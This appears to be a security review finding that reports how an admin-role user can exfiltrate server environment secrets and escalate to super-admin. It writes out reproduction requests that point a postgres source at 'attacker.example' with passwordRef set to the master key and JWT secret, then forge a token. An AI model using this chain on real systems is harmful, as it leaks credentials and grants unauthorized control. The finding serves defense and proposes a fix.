## Finding that blocks (evidence to block: a reproducible command I ran)
F1 (S1, security, FAIL on VA1/VA5/VA8 intent): a role `admin` (below super-admin) can make the server send ANY environment variable to an attacker-chosen host, and so can forge a super-admin token.
- Code read by me: apps/api/src/admin-routes.ts:521-535 (`sources.create`, minRole admin) accepts a postgres source whose `host` is free text (packages/schemas/src/sources.ts HostName regex) and whose `passwordRef` is ANY UPPER_SNAKE env name (sources.ts:45 `EnvName`, no allow-list). admin-routes.ts:389-394 `credentialFor` then reads `(d.env ?? process.env)[ref]` when no secret is stored; `POST sources/:id/test` (minRole admin, :619) passes that value to `d.postgres.test(src.config, password)`. In production index.ts:944-946 wires `createPostgresTestPort({ env })` and `env` is process.env, which holds VC_ADMIN_MASTER_KEY and VC_ADMIN_JWT_SECRET. `mcpPortFor` (:~820) hands the password to mcp/pathlynks `buildPgConfig` (mcp/pathlynks/src/connect.ts:29-45), which sets `host` and `password` unchanged into the pg driver config. The same hole exists for GitHub: `tokenRef` is any env name and the value is sent as `Authorization: Bearer` (admin-routes.ts:642, createGithubPort) to api.github.com.
- Reproduction (probe `scratchpad/probe-b.mts`, section H1, run through `bash D:/vc/scripts/vc-testlock.sh pnpm exec tsx probe-b.mts` from apps/api, dummy values only): as the seeded `admin` token, `POST sources {kind:"postgres", host:"attacker.example", port:5432, ..., passwordRef:"VC_ADMIN_MASTER_KEY", tables:[students, saved_careers, compare_list, assessments]}` -> 201; `POST sources/evil-pg/test` -> 200; the injected postgres port received host `attacker.example` and a password equal to the env value of VC_ADMIN_MASTER_KEY (`passwordEqualsMaster: true`). A second source with `tokenRef: VC_ADMIN_JWT_SECRET` delivered the JWT secret value to the GitHub port as the token (`equals jwt secret=true`). A token signed with that secret for a super-admin email is accepted (`GET /me` -> role super-admin). So an admin can read the signing secret and master key by pointing a test at a server they control (the real pg client sends the password in cleartext if the server asks for cleartext auth; TLS verification only needs a valid cert for their own domain), then become super-admin and decrypt stored secrets. I did not open a real socket (fakes only); the proof is the hand-off of the value and host to the port and to buildPgConfig, which is the last code in this repo before the driver.
- Why it is a FAIL and not a note: the role matrix (VA5) and G5 deliberately keep secrets from `admin` (PUT sources/:id/secret is super-admin only, VA1 secrets never leave), and this is a privilege escalation admin -> super-admin in changed code, even though no criterion names this path (Reviewer scope: a security defect in the changed code fails).
- Suggested direction for the repair (not binding): console-created sources may not name an arbitrary env var (allow-list the two names the seed uses, or require a stored encrypted secret for every console-created source and ignore `*Ref` unless the source was seeded from config/sources.json), and restrict postgres `host` for console-created sources (or make host/port/passwordRef settable by super-admin only). Add a test: admin-created source with `passwordRef: VC_ADMIN_MASTER_KEY` / `VC_ADMIN_JWT_SECRET` -> 400 or never read.
